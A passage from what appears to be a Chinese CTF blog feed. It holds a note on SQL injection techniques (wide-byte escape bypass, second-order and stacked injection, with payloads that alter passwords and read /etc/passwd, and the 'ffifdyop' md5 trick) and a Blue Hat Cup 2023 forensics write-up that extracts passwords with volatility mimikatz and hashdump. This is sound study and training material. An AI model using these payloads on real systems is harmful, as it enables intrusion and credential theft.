进行了一次编码</p><p>当转义使用的<code>\</code>为ASCII编码，而客户端传入的参数被当成GBK等宽字节编码，则可以通过在<code>\</code>之前插入一个十六进制字节（ASCII码要大于128，才到汉字的范围）来让mysql以为插入的字节和<code>\</code>是一个中文字符，从而吃掉<code>\</code>，摧毁转义。</p><h4 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><ol><li><p><code>preg_quote</code>函数</p><p><code>preg_quote()</code> 将字符串中所有正则表达式的特殊字符前添加反斜杠（<code>\</code>）。这些特殊字符包括：<code>`. \ + * ? [ ^ ] $ ( ) &#123; &#125; = ! &lt; &gt; | : -</code></p><p><strong>语法：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">preg_quote</span> ( <span class="keyword">string</span> <span class="variable">$str</span>  )</span><br></pre></td></tr></table></figure><p><strong>参数：</strong></p><ul><li><code>$str</code>：要进行转义的字符串。</li></ul><p>例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码分别转义了反斜杠<code>\</code>、单引号<code>&#39;</code>和双引号<code>&quot;</code></p></li><li><p><code>addslashes</code> 函数</p><p><code>addslashes()</code>是PHP中的一个内置函数，用于在某些<strong>特殊字符前添加反斜杠</strong></p><p>特殊字符包括单引号 <code>&#39;</code>，双引号 <code>&quot;</code>，反斜杠 <code>\</code> 和 NULL 字符</p></li><li><p><code>mysql_real_escape_string</code>函数</p><p>mysql_real_escape_string的作用和用法和addslashes基本一致</p></li></ol><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>比如使用<code>%df&#39;</code>会被PHP当中的addslashes函数转义为“<code>%df\&#39;</code>。<br><code>\</code>即url里面的<code>%5c</code>, <code>&#39;</code>对应的url编码是<code>%27</code>，那么也就是说，<code>%df\&#39;</code>会被转义<code>%df%5c%27</code><br>倘若网站的字符集是GBK，mysql使用的编码也是GBK的话，就会认为<code>%df%5c%27</code>是一个宽字节。<br><code>%df%5c</code>会结合(因为宽字节是占两个字节)，也就是<code>縗</code>。后面就有一个<code>’</code>，这样就能成功构造注入语句。</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>在第一次进行数据库插入数据的时候，后端仅仅只是使用了 <code>addslashes</code> 或者是借助<code>get_magic_quotes_gpc</code> 对其中的特殊字符进行了转义，但在存入数据库时还是原来的数据，数据中一般带有单引号和＃号，然后下次使用在拼凑SQL中，所以就形成了二次注入。</p><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><ol><li>插入1‘#</li><li>转义成1\’#</li><li>不能注入，但是保存在数据库时变成了原来的1’#</li><li>利用1’#进行注入,这里利用时<strong>要求取出数据时不转义</strong></li></ol><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>在堆叠注入中，攻击者通常会使用分号(<code>;</code>)将多条SQL命令分隔开来。这种方法的成功执行依赖于后端数据库管理系统的支持，因为并非所有的数据库系统都支持一次执行多个查询。</p><p>同时也并非什么情况下都能使用堆叠注入，例如PHP中的<code>mysql_query</code>函数不支持执行多个语句，而<code>mysqli_multi_query</code>函数则允许在一个调用中执行多个SQL语句</p><p>由于页面的回显通常只会展示第一个语句的结果，所以后面那些语句适合执行一些非查询的SQL语句操作</p><h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><p>下面列举了一些堆叠注入中<strong>可能用到的SQL操作</strong></p><ol><li><p>修改数据库中的数据项（账户密码）</p><p><code>?id=1&#39;;update users set password=&#39;12345&#39; where username=&#39;Dumb&#39; ;--+</code></p></li><li><p>增加一条数据</p><p><code>?id=1&#39;;insert into users values(3,&#39;R1ck&#39;,&#39;123456&#39;);</code></p></li><li><p>加载文件</p><p><code>?id=1&#39;;select load_file(&#39;/etc/passwd&#39;);--+</code></p></li></ol><h2 id="特殊场景"><a href="#特殊场景" class="headerlink" title="特殊场景"></a>特殊场景</h2><h3 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h3><p>题目中可能会计算密码的md5值来比对</p><p><code>$password = md5($_POST[&#39;password&#39;],true);</code></p><p>我们需要了解一下md5()函数中，设置true参数有什么用</p><p>string md5( string $str[, bool $raw_output = false] )</p><ul><li>raw_output：如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</li></ul><p>那么当我们输入的password参数内容在计算md5哈希值后，会将哈希值根据转为原始二进制数据的字符串</p><p>此时我们可以通过精心构造输入，例如<code>ffifdyop</code></p><p>它在经过md5函数后会得到<code>&#39;or&#39;6�]��!r,��b</code></p><img src="/posts/1dc1c5acd0e2/image-20240428173634700.png" class="" title="image-20240428173634700"><p>那么就可以作为万能密码来使用</p><p><strong>例题</strong>：ctfshow平台的web187</p><h3 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h3><p>PHP 是一种弱类型语言，它在比较数字和字符串时会进行类型转换</p><ul><li><strong>当数字与字符串比较时</strong>，PHP 通常会尝试将字符串转换成数字。如果字符串的开头部分包含数字，那么这些数字将被用来进行比较。如果字符串开头不是数字，它通常会被转换为 <code>0</code>。例如，比较 <code>&quot;123&quot; == 123</code> 将返回 <code>true</code>，而 <code>&quot;abc&quot; == 0</code> 也会返回 <code>true</code>。</li><li><strong>使用 <code>==</code> 和 <code>===</code></strong>：PHP 中 <code>==</code> 用于值的比较，它会进行类型转换。<code>===</code> 用于严格比较，即值和类型都必须相同，因此 <code>&quot;123&quot; === 123</code> 将返回 <code>false</code>。</li></ul><p>在<strong>SQL</strong>中，类型转换规则依赖于使用的数据库系统，但大多数数据库管理系统（如 MySQL）也表现出一定的弱类型特征：</p><p>数字和字符串比较少时，字符串会转换为数字，如<code>0==admin</code>，那么如果输入的username是0，则会匹配所有开头不是数字或者为0的字符串和数字0</p><p><strong>例题</strong>：ctfshow平台的web188</p>]]></content>
      
      
      <categories>
          
          <category> CTF Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从参加蓝帽杯2023入门取证</title>
      <link href="/posts/4622dd9d8324/"/>
      <url>/posts/4622dd9d8324/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽说这次蓝帽杯2023是取证题型初体验，而且只解出来6道取证，但取证给我的印象还是挺<strong>有趣</strong>的</p><p>颇有一种模拟侦探收集信息的感觉</p><p>希望通过复现wp以及查阅资料，能够形成初步的取证知识体系，为以后的大赛做好准备</p><div class="note primary flat"><p>在复现过程中，我会尽量使用不需要授权的<strong>开源取证软件</strong>，一是因为过于依赖<strong>国产的傻瓜式取证软件</strong>不利于对取证原理的学习，同时也是防止在以后的比赛中万一没有及时获得像盘古、火眼的授权时，陷入无工具可用的尴尬场面</p></div><h2 id="复现wp"><a href="#复现wp" class="headerlink" title="复现wp"></a>复现wp</h2><h3 id="蓝帽杯2023初赛"><a href="#蓝帽杯2023初赛" class="headerlink" title="蓝帽杯2023初赛"></a>蓝帽杯2023初赛</h3><p>由于赛题的镜像经过了加密，首先使用<strong>VeraCrypt</strong>将其解密为磁盘分卷</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230901202222577.png" alt="image-20230901202222577"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230901202441360.png" alt="image-20230901202441360"></p><p>此时<strong>取证检材容器</strong>被加载到对应盘符中</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230901202631237.png" alt="image-20230901202631237"></p><h4 id="apk分析"><a href="#apk分析" class="headerlink" title="apk分析"></a>apk分析</h4><h5 id="涉案apk的包名是？"><a href="#涉案apk的包名是？" class="headerlink" title="涉案apk的包名是？"></a>涉案apk的包名是？</h5><p>将apk文件拖入APK Messenger中进行分析，得到包名:<code>com.vestas.app</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905103912013.png" alt="image-20230905103912013"></p><h5 id="涉案apk的签名序列号是？"><a href="#涉案apk的签名序列号是？" class="headerlink" title="涉案apk的签名序列号是？"></a>涉案apk的签名序列号是？</h5><p>使用工具<strong>MobSF</strong>分析apk数据包，签名序列号为报告中<strong>SIGNER CERTIFICATE</strong>模块的<strong>Serial Number</strong>：<code>0x563b45ca</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905105427472.png" alt="image-20230905105427472"></p><h5 id="涉案apk中DCLOUD-AD-ID的值是？"><a href="#涉案apk中DCLOUD-AD-ID的值是？" class="headerlink" title="涉案apk中DCLOUD_AD_ID的值是？"></a>涉案apk中DCLOUD_AD_ID的值是？</h5><p>使用工具jadx反编译apk安装包，在得到的资源文件全局查询<strong>dcloud_ad_id</strong>，整改的相应属性及对应的值<code>2147483647</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905220127485.png" alt="image-20230905220127485"></p><h5 id="涉案apk的服务器域名是？"><a href="#涉案apk的服务器域名是？" class="headerlink" title="涉案apk的服务器域名是？"></a>涉案apk的服务器域名是？</h5><p>将软件安装在雷电模拟器上，打开后使用bupsuite进行抓包</p><p>服务器域名为打开app时请求的<strong>目的地host</strong><code>vip.licai.com</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905224347406.png" alt="image-20230905224347406"></p><h5 id="涉案apk的主入口是？"><a href="#涉案apk的主入口是？" class="headerlink" title="涉案apk的主入口是？"></a>涉案apk的主入口是？</h5><p>使用工具<strong>MobSF</strong>分析apk数据包，签名序列号为报告中的<strong>Main Activity</strong><code>io.dcloud.PandoraEntry</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230905225011434.png" alt="image-20230905225011434"></p><h5 id="该镜像是用的什么模拟器？"><a href="#该镜像是用的什么模拟器？" class="headerlink" title="该镜像是用的什么模拟器？"></a>该镜像是用的什么模拟器？</h5><p>在题目给出的配置文件中可以发现<code>雷电模拟器</code>的配置文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230906084732386.png" alt="image-20230906084732386"></p><h4 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h4><h5 id="该镜像中用的聊天软件名称是什么？"><a href="#该镜像中用的聊天软件名称是什么？" class="headerlink" title="该镜像中用的聊天软件名称是什么？"></a>该镜像中用的聊天软件名称是什么？</h5><p>使用雷电模拟器进行仿真，发现聊天软件名称叫<code>与你</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230906084914731.png" alt="image-20230906084914731"></p><h5 id="聊天软件的包名是？"><a href="#聊天软件的包名是？" class="headerlink" title="聊天软件的包名是？"></a>聊天软件的包名是？</h5><p>使用软件Magnet AXIOM加载证据<strong>data.vmdk</strong></p><p>选择使用痕迹中的移动设备</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230906092239093.png" alt="image-20230906092239093"></p><p>可以看到相关软件的包名<code>com.uneed.yuni</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230906092400947.png" alt="image-20230906092400947"></p><h5 id="投资理财产品中，受害人最后投资的产品最低要求投资多少钱？"><a href="#投资理财产品中，受害人最后投资的产品最低要求投资多少钱？" class="headerlink" title="投资理财产品中，受害人最后投资的产品最低要求投资多少钱？"></a>投资理财产品中，受害人最后投资的产品最低要求投资多少钱？</h5><p>使用雷电模拟器仿真，查看聊天软件<strong>与你</strong>中的聊天记录</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230906090822562.png" alt="image-20230906090822562"></p><h5 id="受害人是经过谁介绍认识王哥？"><a href="#受害人是经过谁介绍认识王哥？" class="headerlink" title="受害人是经过谁介绍认识王哥？"></a>受害人是经过谁介绍认识王哥？</h5><p>使用雷电模拟器仿真，查看聊天软件<strong>与你</strong>中的聊天记录</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230906090807208.png" alt="image-20230906090807208"></p><h4 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h4><h5 id="请给出计算机镜像pc-e01的SHA-1值？"><a href="#请给出计算机镜像pc-e01的SHA-1值？" class="headerlink" title="请给出计算机镜像pc.e01的SHA-1值？"></a>请给出计算机镜像pc.e01的SHA-1值？</h5><p>将镜像文件添加到工具<strong>X-Ways</strong>，右键选择属性</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910144738100.png" alt="image-20230910144738100"></p><p>得到SHA-1值</p><h5 id="给出pc-e01在提取时候的检查员？"><a href="#给出pc-e01在提取时候的检查员？" class="headerlink" title="给出pc.e01在提取时候的检查员？"></a>给出pc.e01在提取时候的检查员？</h5><p>将镜像文件添加到工具<strong>X-Ways</strong>，右键选择属性</p><p>检察员为案件描述中<strong>Examiner</strong>字段的值<code>pgs</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910144836605.png" alt="image-20230910144836605"></p><h5 id="请给出嫌疑人计算机内IE浏览器首页地址？"><a href="#请给出嫌疑人计算机内IE浏览器首页地址？" class="headerlink" title="请给出嫌疑人计算机内IE浏览器首页地址？"></a>请给出嫌疑人计算机内IE浏览器首页地址？</h5><p>对镜像进行<strong>系统仿真</strong>，选择清除密码，方便登录取证</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910150550050.png" alt="image-20230910150550050"></p><p>打开IE浏览器的Internet选项即可看到首页设置</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910152718075.png" alt="image-20230910152718075"></p><h5 id="请给出嫌疑人杨某登录理财网站前台所用账号密码？"><a href="#请给出嫌疑人杨某登录理财网站前台所用账号密码？" class="headerlink" title="请给出嫌疑人杨某登录理财网站前台所用账号密码？"></a>请给出嫌疑人杨某登录理财网站前台所用账号密码？</h5><p>在仿真系统中发现只有IE和Chrome两个浏览器</p><p>打开Chrome的自动填充设置，查看账号和密码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910154436525.png" alt="image-20230910154436525"></p><h5 id="请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？"><a href="#请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？" class="headerlink" title="请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？"></a>请给出嫌疑人电脑内pdf文件默认打开程序的当前版本号？</h5><p>在系统仿真下新建一个文件，修改后缀为pdf，打开时发现默认打开程序为<strong>WPS</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910154919266.png" alt="image-20230910154919266"></p><p>在wps的设置中点击关于WPS</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910155144625.png" alt="image-20230910155144625"></p><p>点击<strong>查看更多信息</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910155213917.png" alt="image-20230910155213917"></p><p>得到版本号</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910155237874.png" alt="image-20230910155237874"></p><h5 id="请给出嫌疑人计算机内文件名为“C盘清理-bat”的SHA-1？"><a href="#请给出嫌疑人计算机内文件名为“C盘清理-bat”的SHA-1？" class="headerlink" title="请给出嫌疑人计算机内文件名为“C盘清理.bat”的SHA-1？"></a>请给出嫌疑人计算机内文件名为“C盘清理.bat”的SHA-1？</h5><p>在盘古石计算机取证分析系统中查找可执行文件<code>C盘清理.bat</code>，并未找到</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910155540883.png" alt="image-20230910155540883"></p><p>猜测是文件被加密了，在D盘发现一个disk.2023-9-1的镜像文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910160041865.png" alt="image-20230910160041865"></p><p>将其导出后重新在盘古石中对其进行分析，发现确实存在目标文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910160834201.png" alt="image-20230910160834201"></p><p>导出的同时勾选<strong>计算哈希值</strong>即可</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910161031189.png" alt="image-20230910161031189"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910161144214.png" alt="image-20230910161144214"></p><h5 id="请给出嫌疑人Vera-Crypt加密容器的解密密码？"><a href="#请给出嫌疑人Vera-Crypt加密容器的解密密码？" class="headerlink" title="请给出嫌疑人Vera Crypt加密容器的解密密码？"></a>请给出嫌疑人Vera Crypt加密容器的解密密码？</h5><p>由于disk.2023-9-1中存在Vera Crypt软件，考虑密码也在该镜像中</p><p>分析<strong>加密容器文件</strong>，找到目标文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910162702277.png" alt="image-20230910162702277"></p><p>分析memdump.mem，得到<strong>Veracrypt密钥</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910163007593.png" alt="image-20230910163007593"></p><p>将其导出为内存密钥，并应用到刚刚发现的目标文件上</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910163317952.png" alt="image-20230910163317952"></p><p>在<code>重要资料.xlsx</code>中找到密码</p><h5 id="请给出嫌疑人电脑内iSCSI服务器对外端口号？"><a href="#请给出嫌疑人电脑内iSCSI服务器对外端口号？" class="headerlink" title="请给出嫌疑人电脑内iSCSI服务器对外端口号？"></a>请给出嫌疑人电脑内iSCSI服务器对外端口号？</h5><p>windows上的iSCSI服务器一般会搭在虚拟机上</p><p>在仿真系统上找到与虚拟机相关的软件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910163723642.png" alt="image-20230910163723642"></p><p>运行软件后找到端口</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910163820698.png" alt="image-20230910163820698"></p><h5 id="请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？"><a href="#请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？" class="headerlink" title="请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？"></a>请给出嫌疑人电脑内iSCSI服务器CHAP认证的账号密码？</h5><p>CHAP认证中的密码被隐去，但可以得知用户名为user</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910164054907.png" alt="image-20230910164054907"></p><p>导出软件的文件夹，用vscode暴力搜索user，成功在配置文件中搜索到密码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910165137622.png" alt="image-20230910165137622"></p><h5 id="分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？"><a href="#分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？" class="headerlink" title="分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？"></a>分析嫌疑人电脑内提现记录表，用户“mi51888”提现总额为多少？</h5><p>在刚刚解密的文件中找到提现记录的表格</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910165536539.png" alt="image-20230910165536539"></p><p>在excel表格中使用公式计算</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910170058435.png" alt="image-20230910170058435"></p><h4 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h4><h5 id="请给出计算机内存创建北京时间？"><a href="#请给出计算机内存创建北京时间？" class="headerlink" title="请给出计算机内存创建北京时间？"></a>请给出计算机内存创建北京时间？</h5><p>使用工具<strong>volatility</strong>查看内存镜像信息</p><p><code>python2 vol.py -f memdump.mem imageinfo</code></p><p>下方时间为本地时间，即北京时间</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910203828708.png" alt="image-20230910203828708"></p><h5 id="请给出计算机内用户yang88的开机密码？"><a href="#请给出计算机内用户yang88的开机密码？" class="headerlink" title="请给出计算机内用户yang88的开机密码？"></a>请给出计算机内用户yang88的开机密码？</h5><p>使用volatility工具的插件<strong>mimikatz</strong></p><p>此处系统格式尝试imageinfo中搜索到的第一种<code>Win7SP1x64</code></p><p>命令为<code>python2 vol.py -f memdump.mem --profile=Win7SP1x64 mimikatz</code></p><p>得到如下账号和密码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910210120621.png" alt="image-20230910210120621"></p><h5 id="提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？"><a href="#提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？" class="headerlink" title="提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？"></a>提取内存镜像中的USB设备信息，给出该USB设备的最后连接北京时间？</h5><p>使用volatility工具的插件<strong>usbstor</strong></p><div class="note warning flat"><p>注意此处为格林威治时间，需要还原成北京时间</p></div><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910211358767.png" alt="image-20230910211358767"></p><h5 id="请给出用户yang88的LMHASH值？"><a href="#请给出用户yang88的LMHASH值？" class="headerlink" title="请给出用户yang88的LMHASH值？"></a>请给出用户yang88的LMHASH值？</h5><p>使用volatility工具的插件<strong>hashdump</strong></p><p>LMHash为左边那一段</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910212715121.png" alt="image-20230910212715121"></p><h5 id="请给出用户yang88访问过文件“提现记录-xlsx”的北京时间？"><a href="#请给出用户yang88访问过文件“提现记录-xlsx”的北京时间？" class="headerlink" title="请给出用户yang88访问过文件“提现记录.xlsx”的北京时间？"></a>请给出用户yang88访问过文件“提现记录.xlsx”的北京时间？</h5><p>使用volatility工具的插件<strong>shellbag</strong></p><p>命令为<code>python2 vol.py -f memdump.mem --profile=Win7SP1x64 timeliner &gt; ../timeliner.txt</code></p><p>输出结果在上一层目录的<code>timeliner.txt</code>中，再到其中查找记录</p><p>此处需要将文件名转为<strong>url编码</strong>再查询，匹配字符串为<code>%E6%8F%90%E7%8E%B0%E8%AE%B0%E5%BD%95.xlsx</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910220422026.png" alt="image-20230910220422026"></p><h5 id="请给出“VeraCrypt”最后一次执行的北京时间？"><a href="#请给出“VeraCrypt”最后一次执行的北京时间？" class="headerlink" title="请给出“VeraCrypt”最后一次执行的北京时间？"></a>请给出“VeraCrypt”最后一次执行的北京时间？</h5><p>使用volatility工具的插件<strong>pslist</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910221225937.png" alt="image-20230910221225937"></p><p>时间需要换算</p><h5 id="分析内存镜像，请给出用户在“2023-06-20-16-56-57-UTC-0”访问过“维斯塔斯”后台多少次？"><a href="#分析内存镜像，请给出用户在“2023-06-20-16-56-57-UTC-0”访问过“维斯塔斯”后台多少次？" class="headerlink" title="分析内存镜像，请给出用户在“2023-06-20 16:56:57 UTC+0”访问过“维斯塔斯”后台多少次？"></a>分析内存镜像，请给出用户在“2023-06-20 16:56:57 UTC+0”访问过“维斯塔斯”后台多少次？</h5><p>由于维斯塔斯为网页端程序，可以从浏览器节录中查询访问记录</p><p>使用<strong>盘古石计算机取证分析系统</strong>分析Chrome</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910221800612.png" alt="image-20230910221800612"></p><p>检索关键字<strong>后台登录</strong>，得到结果</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910221917275.png" alt="image-20230910221917275"></p><h5 id="请给出用户最后一次访问chrome浏览器的进程PID？"><a href="#请给出用户最后一次访问chrome浏览器的进程PID？" class="headerlink" title="请给出用户最后一次访问chrome浏览器的进程PID？"></a>请给出用户最后一次访问chrome浏览器的进程PID？</h5><p>使用volatility工具的插件<strong>pslist</strong></p><p>由于结果是按结束时间来排序，所以很好定位</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230910222158513.png" alt="image-20230910222158513"></p><h4 id="服务器取证"><a href="#服务器取证" class="headerlink" title="服务器取证"></a>服务器取证</h4><h5 id="分析涉案服务器，请给出涉案服务器的内核版本？"><a href="#分析涉案服务器，请给出涉案服务器的内核版本？" class="headerlink" title="分析涉案服务器，请给出涉案服务器的内核版本？"></a>分析涉案服务器，请给出涉案服务器的内核版本？</h5><p>由于已知该镜像涉及到服务器，所以丢入盘古石计算机取证分析系统时在应用分析处勾选<strong>服务器</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911104657292.png" alt="image-20230911104657292"></p><p>提前勾选linux，则软件可以分析到内核版本</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911104806315.png" alt="image-20230911104806315"></p><h5 id="分析涉案服务器，请给出MySQL数据库的root账号密码？"><a href="#分析涉案服务器，请给出MySQL数据库的root账号密码？" class="headerlink" title="分析涉案服务器，请给出MySQL数据库的root账号密码？"></a>分析涉案服务器，请给出MySQL数据库的root账号密码？</h5><p>使用<strong>盘古石计算机取证分析系统</strong>找到网站目录</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911110704591.png" alt="image-20230911110704591"></p><p>发现密码就在涉案网站的环境配置文件中，说明这题爆搜也可以搜出来</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911110935367.png" alt="image-20230911110935367"></p><h5 id="分析涉案服务器，请给出涉案网站RDS数据库地址？"><a href="#分析涉案服务器，请给出涉案网站RDS数据库地址？" class="headerlink" title="分析涉案服务器，请给出涉案网站RDS数据库地址？"></a>分析涉案服务器，请给出涉案网站RDS数据库地址？</h5><p>同样在环境配置文件中</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911111223494.png" alt="image-20230911111223494"></p><h5 id="请给出涉网网站数据库版本号"><a href="#请给出涉网网站数据库版本号" class="headerlink" title="请给出涉网网站数据库版本号?"></a>请给出涉网网站数据库版本号?</h5><p>开始仿真，首先在centos中查看ip和端口</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911133919792.png" alt="image-20230911133919792"></p><p>用xshell连接系统，因为xshell的终端不会有中文乱码等问题</p><p>修改宝塔面板密码后启动宝塔面板服务</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911144527084.png" alt="image-20230911144527084"></p><p>使用<code>mysql -Version</code>即可查看数据库版本</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911145106845.png" alt="image-20230911145106845"></p><h5 id="请给出嫌疑人累计推广人数？"><a href="#请给出嫌疑人累计推广人数？" class="headerlink" title="请给出嫌疑人累计推广人数？"></a>请给出嫌疑人累计推广人数？</h5><p>将题目给的检材中的<strong>数据库备份文件恢复</strong>到服务器中，得到viplicai数据库</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911161033185.png" alt="image-20230911161033185"></p><p>前面分析计算机时得到后台地址为<code>http://vip.licai.com:8083/AdminV9YY/Login</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911204731064.png" alt="image-20230911204731064"></p><p>此时将域名替换为服务器ip，即<code>http://192.168.58.132:8083/AdminV9YY/Login</code>，成功进入后台登录界面</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230911204905936.png" alt="image-20230911204905936"></p><p>由于没有账号密码，我们尝试修改源文件改变登录规则，在宝塔面板中进行修改</p><p>查找登录文件</p><p><img 